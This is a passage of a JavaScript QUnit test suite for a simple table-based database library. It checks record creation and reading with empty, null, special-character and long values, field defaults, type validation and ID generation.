      const testData = { name: "", description: "", count: 0 };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      assert.equal(
        result.status,
        200,
        "Should create record with empty strings successfully"
      );
      assert.ok(result.data, "Should return created data");
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(createdRecord.data.name, "", "Empty name should be stored");
      assert.equal(
        createdRecord.data.description,
        "",
        "Empty description should be stored"
      );
    });

    QUnit.test("Null value handling", function (assert) {
      const testData = { name: "Null Test", description: null, count: 0 };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      if (result.status === 200) {
        assert.ok(result.data, "Should return created data");
        const createdRecord = db.read(this.testTableName, result.id);
        assert.equal(
          createdRecord.status,
          200,
          "Should read record successfully"
        );
        assert.equal(
          createdRecord.data.name,
          "Null Test",
          "Name should be stored"
        );
        assert.ok(
          createdRecord.data.description === null ||
            createdRecord.data.description === "",
          "Description should be null or empty string"
        );
      } else {
        assert.ok(
          result.error,
          "Should return error for null values if not supported"
        );
      }
    });

    QUnit.test("Special character handling", function (assert) {
      const specialChars = "!@#$%^&*()_+-=[]{}|;':\",./<>?`~";
      const testData = {
        name: specialChars,
        description: "Special chars test",
        count: 42,
      };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      assert.equal(
        result.status,
        200,
        "Should create record with special characters successfully"
      );
      assert.ok(result.data, "Should return created data");
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        specialChars,
        "Special characters should be stored correctly"
      );
    });

    QUnit.test("Very long string handling", function (assert) {
      const longString = "A".repeat(1000);
      const testData = {
        name: longString,
        description: "Long string test",
        count: 1,
      };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      assert.equal(
        result.status,
        200,
        "Should create record with long string successfully"
      );
      assert.ok(result.data, "Should return created data");
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        longString,
        "Long string should be stored correctly"
      );
      assert.equal(
        createdRecord.data.name.length,
        1000,
        "String length should be preserved"
      );
    });

    QUnit.module("Field Definition Utility Tests", {
      beforeEach: function (assert) {
        this.testTableName = "field_def_test_table";
        this.testHistoryTableName = "field_def_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: { type: "string", default: "Default Name" },
            age: { type: "number", default: 25 },
            email: { type: "string", default: "no-email@example.com" },
            active: { type: "boolean", default: true },
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("_getFieldDefinition functionality", function (assert) {
      const testData = {
        name: "Test User",
        age: 30,
        email: "test@example.com",
        active: false,
      };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      assert.equal(result.status, 200, "Should create record successfully");
      assert.ok(result.data, "Should return created data");
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        "Test User",
        "Name should be as provided"
      );
      assert.equal(createdRecord.data.age, 30, "Age should be as provided");
      assert.equal(
        createdRecord.data.email,
        "test@example.com",
        "Email should be as provided"
      );
      assert.equal(
        createdRecord.data.active,
        false,
        "Active should be as provided"
      );
      assert.ok(
        createdRecord.data.created_at,
        "Created_at should have default value"
      );
    });

    QUnit.test("_getExpectedType functionality", function (assert) {
      const testData = { name: "Type Test", age: 25, active: true };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      assert.equal(result.status, 200, "Should create record successfully");
      const invalidData = {
        name: "Invalid Type",
        age: "not a number",
        active: true,
      };
      const invalidResult = db.create(
        this.testTableName,
        invalidData,
        Object.keys(invalidData)
      );
      if (invalidResult.status === 400) {
        assert.ok(invalidResult.error, "Should return error for invalid type");
      } else {
        assert.ok(true, "Type validation not implemented");
      }
    });

    QUnit.test("_getDefaultValue functionality", function (assert) {
      const testData = { name: "Default Test" };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      assert.equal(result.status, 200, "Should create record successfully");
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        "Default Test",
        "Name should be as provided"
      );
      assert.equal(createdRecord.data.age, 25, "Age should have default value");
      assert.equal(
        createdRecord.data.email,
        "no-email@example.com",
        "Email should have default value"
      );
      assert.equal(
        createdRecord.data.active,
        true,
        "Active should have default value"
      );
      assert.ok(
        createdRecord.data.created_at,
        "Created_at should have default value"
      );
    });

    QUnit.module("Type Checking Utility Tests", {
      beforeEach: function (assert) {
        this.testTableName = "type_check_test_table";
        this.testHistoryTableName = "type_check_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            string_field: "string",
            number_field: "number",
            boolean_field: "boolean",
            date_field: "date",
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("_checkType functionality", function (assert) {
      const validData = {
        string_field: "Test String",
        number_field: 42,
        boolean_field: true,
        date_field: new Date("2023-01-15"),
      };
      const result = db.create(
        this.testTableName,
        validData,
        Object.keys(validData)
      );
      assert.equal(
        result.status,
        200,
        "Should create record with valid types successfully"
      );
      const invalidData = {
        string_field: 123,
        number_field: "not a number",
        boolean_field: "not boolean",
        date_field: "not a date",
      };
      const invalidResult = db.create(
        this.testTableName,
        invalidData,
        Object.keys(invalidData)
      );
      if (invalidResult.status === 400) {
        assert.ok(invalidResult.error, "Should return error for invalid types");
      } else {
        assert.ok(true, "Type validation not implemented");
      }
    });

    QUnit.test("_checkTypeWithLogs functionality", function (assert) {
      const validData = {
        string_field: "Log Test String",
        number_field: 100,
        boolean_field: false,
        date_field: new Date("2023-06-15"),
      };
      const result = db.createWithLogs(
        this.testTableName,
        validData,
        Object.keys(validData)
      );
      assert.equal(
        result.status,
        200,
        "Should create record with logs successfully"
      );
      assert.ok(result.data, "Should return created data");
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.string_field,
        "Log Test String",
        "String field should be correct"
      );
      assert.equal(
        createdRecord.data.number_field,
        100,
        "Number field should be correct"
      );
      assert.equal(
        createdRecord.data.boolean_field,
        false,
        "Boolean field should be correct"
      );
    });

    QUnit.module("Valid Creation Types Tests", {
      beforeEach: function (assert) {
        this.testTableName = "valid_types_test_table";
        this.testHistoryTableName = "valid_types_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            text_field: "string",
            numeric_field: "number",
            flag_field: "boolean",
            timestamp_field: "date",
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function () {
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("_checkValidCreationTypes functionality", function (assert) {
      const testCases = [
        {
          data: {
            text_field: "Simple string",
            numeric_field: 0,
            flag_field: false,
            timestamp_field: new Date(),
          },
          description: "Basic types",
        },
        {
          data: {
            text_field: "",
            numeric_field: -1.5,
            flag_field: true,
            timestamp_field: new Date("2020-01-01"),
          },
          description: "Edge cases",
        },
        {
          data: {
            text_field: "Special chars: !@#$%^&*()",
            numeric_field: 999999,
            flag_field: false,
            timestamp_field: new Date("2030-12-31"),
          },
          description: "Special characters and large numbers",
        },
      ];
      for (const testCase of testCases) {
        const result = db.create(
          this.testTableName,
          testCase.data,
          Object.keys(testCase.data)
        );
        assert.equal(
          result.status,
          200,
          `Should create record with ${testCase.description} successfully`
        );
        assert.ok(
          result.data,
          `Should return data for ${testCase.description}`
        );
        const createdRecord = db.read(this.testTableName, result.id);
        assert.equal(
          createdRecord.status,
          200,
          `Should read record with ${testCase.description} successfully`
        );
      }
    });

    QUnit.module("Internal Utility Method Tests", {
      beforeEach: function (assert) {
        this.testTableName = "internal_util_test_table";
        this.testHistoryTableName = "internal_util_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            value: "number",
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        const testData = [
          { name: "Utility Test 1", value: 100 },
          { name: "Utility Test 2", value: 200 },
          { name: "Utility Test 3", value: 300 },
        ];

        for (const data of testData) {
          db.create(this.testTableName, data, Object.keys(data));
        }
      },

      afterEach: function () {
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("_findRowById functionality", function (assert) {
      const allRecords = db.getAll(this.testTableName, {}, false);
      assert.equal(allRecords.status, 200, "Should get all records");
      assert.ok(allRecords.data.length > 0, "Should have records");
      const testId = allRecords.data[0].id;
      const foundRecord = db.read(this.testTableName, testId);
      assert.equal(foundRecord.status, 200, "Should find record by ID");
      assert.equal(foundRecord.data.id, testId, "Should return correct record");
    });

    QUnit.test("_getHeaders functionality", function (assert) {
      const testData = { name: "Header Test", value: 999 };
      const result = db.create(
        this.testTableName,
        testData,
        Object.keys(testData)
      );
      assert.equal(result.status, 200, "Should create record successfully");
      assert.ok(result.data, "Should return created data");
      const createdRecord = db.read(this.testTableName, result.id);
      assert.equal(
        createdRecord.status,
        200,
        "Should read record successfully"
      );
      assert.equal(
        createdRecord.data.name,
        "Header Test",
        "Name should be stored correctly"
      );
      assert.equal(
        createdRecord.data.value,
        999,
        "Value should be stored correctly"
      );
    });

    QUnit.test("_getNextId functionality", function (assert) {
      const initialCount = db.getAll(this.testTableName, {}, false).data.length;
      for (let i = 0; i < 3; i++) {
        const testData = { name: `ID Test ${i}`, value: 1000 + i };
        const result = db.create(
          this.testTableName,
          testData,
          Object.keys(testData)
        );
        assert.equal(
          result.status,
          200,
          `Should create record ${i} successfully`
        );
        assert.ok(result.id, `Record ${i} should have an ID`);
      }
      const finalCount = db.getAll(this.testTableName, {}, false).data.length;
      assert.equal(finalCount, initialCount + 3, "Should have 3 more records");
    });
  });
}
